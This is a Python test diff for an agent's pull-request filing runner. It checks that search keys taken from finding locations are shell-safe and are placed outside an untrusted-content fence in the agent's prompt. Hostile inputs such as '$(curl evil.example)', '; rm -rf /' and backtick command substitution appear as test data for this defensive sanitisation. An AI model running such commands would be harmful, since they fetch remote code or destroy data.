@@ -232,6 +232,68 @@ class SlugTests(unittest.TestCase):
         self.assertEqual(R._slug("investigate"), "investigate")
 
 
+class LocationSearchKeyTests(unittest.TestCase):
+    """The term §0 of the filing skill pastes into a double-quoted `curl` URL.
+
+    Two properties matter and neither is visible from the call site: the key has
+    to be the same string in every install that saw the same file, and it has to
+    be safe in a shell. The fixtures below are real `location` values copied out
+    of a live ledger, which is where both requirements came from -- sixteen of
+    its eighteen rows carried a shell metacharacter.
+    """
+
+    def test_the_key_is_the_bare_file_name(self):
+        self.assertEqual(
+            "platformagent_controller.go",
+            R.location_search_key("k8s-operator/internal/controller/platformagent_controller.go:1093"),
+        )
+
+    def test_three_spellings_of_one_file_give_one_key(self):
+        # The whole point of searching this rather than the location: these are
+        # what `location_key`'s docstring says the same file actually arrives as.
+        spellings = [
+            "k8s-operator/internal/controller/platformagent_manifests.go:1820",
+            "platformagent_manifests.go",
+            "k8s-operator/.../platformagent_manifests.go:1820 (the operator's PATH env var)",
+        ]
+        keys = {R.location_search_key(one) for one in spellings}
+        self.assertEqual({"platformagent_manifests.go"}, keys)
+
+    def test_a_location_carrying_backticks_yields_a_safe_key(self):
+        # Verbatim from the live ledger. Pasted into the skill's double-quoted
+        # URL, the backticks would have been command substitution.
+        key = R.location_search_key(
+            "agents/selfimprove/scripts/selfimprove_run.py:2114 (verify_forge_credential, "
+            "which calls only `gh repo view --json viewerPermission`)"
+        )
+        self.assertEqual("selfimprove_run.py", key)
+        self.assertNotRegex(key, r"[`$\"'();|&<>\s]")
+
+    def test_every_key_is_shell_safe_or_empty(self):
+        hostile = [
+            'foo.py:1 ($(id) and "quoted" and `sub`)',
+            "the gchat webhook",
+            "",
+            "; rm -rf /",
+            "$(curl evil.example)",
+        ]
+        for one in hostile:
+            with self.subTest(location=one):
+                self.assertNotRegex(R.location_search_key(one), r"[`$\"'();|&<>\s]")
+
+    def test_a_location_naming_no_file_yields_no_key(self):
+        # `location_key` falls back to the whole normalised string here, which is
+        # prose. Searching it matches nothing or everything, and the states it
+        # feeds are permanent, so the caller must be told to skip the search.
+        self.assertEqual("", R.location_search_key("the gchat webhook"))
+
+    def test_the_key_matches_the_identity_the_ledger_hashes(self):
+        # If these two ever drift apart, the search stops finding the filings
+        # whose findings share an identity, which is the whole mechanism.
+        location = "k8s-operator/internal/controller/platformagent_controller.go:1093 (updateStatusReady)"
+        self.assertEqual(ledger_mod.location_key(location), R.location_search_key(location))
+
+
 class DescribeInstallTests(unittest.TestCase):
     """Design §8 part 5: the pull request body names the install it came from.
 
@@ -1501,6 +1563,84 @@ class FilingPreflightTests(unittest.TestCase):
 
         R.verify_forge_credential = refuse
         self.assertEqual(R.SKIPPED, self._file("fork", "o/r", "o/r")[0])
+
+
+class SearchKeyInFilingBriefTests(unittest.TestCase):
+    """The key has to reach the filing turn, and outside the fence.
+
+    `location_search_key` being correct buys nothing if the prompt does not
+    carry it: §0 of the skill tells the turn to use the brief's key *verbatim*
+    and not to build a search term out of the location itself, so a brief that
+    omits it sends the turn back to the free-text location this change exists
+    to keep out of a shell.
+    """
+
+    def setUp(self):
+        self.prompt = ""
+
+        def capture(prompt, *a, **k):
+            self.prompt = prompt
+            return (0, "https://github.com/gke-labs/kube-agents/pull/1", None)
+
+        self.prior = R.run_agent
+        R.run_agent = capture
+        self.prior_verify = R.verify_forge_credential
+        R.verify_forge_credential = lambda push, pr, cwd: True
+        stub_base_checkout(self)
+
+    def tearDown(self):
+        R.run_agent = self.prior
+        R.verify_forge_credential = self.prior_verify
+
+    def _file(self, location):
+        R.file_pull_request(
+            {"fingerprint": "abc123", "title": "t", "summary": "s", "location": location},
+            {"revision": "deadbeef", "fetch_ref": "deadbeef"},
+            "/src/repo",
+            "/home/selfimprove",
+            "upstream",
+            "gke-labs/kube-agents",
+            "adamparco/kube-agents",
+            900,
+        )
+        return self.prompt
+
+    def test_the_brief_names_the_key_under_its_own_heading(self):
+        prompt = self._file("k8s-operator/.../platformagent_controller.go:1093 (updateStatusReady)")
+        self.assertIn("PRIOR ART SEARCH KEY", prompt)
+        self.assertIn("`platformagent_controller.go`", prompt)
+
+    def test_the_key_sits_outside_the_untrusted_fence(self):
+        # Inside it, the turn is told to distrust the one search term that is
+        # not agent-written at all -- the runner computed and vetted it.
+        prompt = self._file("selfimprove_run.py:412")
+        head, _, tail = prompt.partition("PRIOR ART SEARCH KEY")
+        self.assertEqual(2, head.count(R.FENCE), "the key must come after the fence closes")
+        self.assertNotIn(R.FENCE, tail)
+
+    def test_a_location_with_no_file_tells_the_turn_to_skip_the_search(self):
+        prompt = self._file("the gchat webhook")
+        self.assertIn("skip the location search", prompt)
+
+    def test_a_hostile_prefix_is_stripped_rather_than_carried(self):
+        # Two defences in series, and this exercises the first: `location_key`
+        # keeps only the segment after the final slash, so the substitution
+        # never reaches `_SEARCH_KEY_SAFE` and the turn gets a usable key
+        # anyway. The finding is still filed, which is the point -- rejecting
+        # the key outright would cost the search on a location that has a
+        # perfectly good file name in it.
+        key_block = self._file("$(curl evil.example)/foo.py:1").split("PRIOR ART SEARCH KEY")[1]
+        self.assertIn("`foo.py`", key_block)
+        self.assertNotIn("$(curl evil.example)", key_block)
+
+    def test_hostile_prose_with_no_file_is_refused_outright(self):
+        # And the second defence: nothing here looks like a file, so
+        # `location_key` falls back to the whole normalised string and
+        # `_SEARCH_KEY_SAFE` rejects it. The turn is told to skip the search
+        # rather than handed a shell command.
+        key_block = self._file("; rm -rf / #").split("PRIOR ART SEARCH KEY")[1]
+        self.assertIn("skip the location search", key_block)
+        self.assertNotIn("rm -rf", key_block)
 
 
 class FilingOutcomeTests(unittest.TestCase):
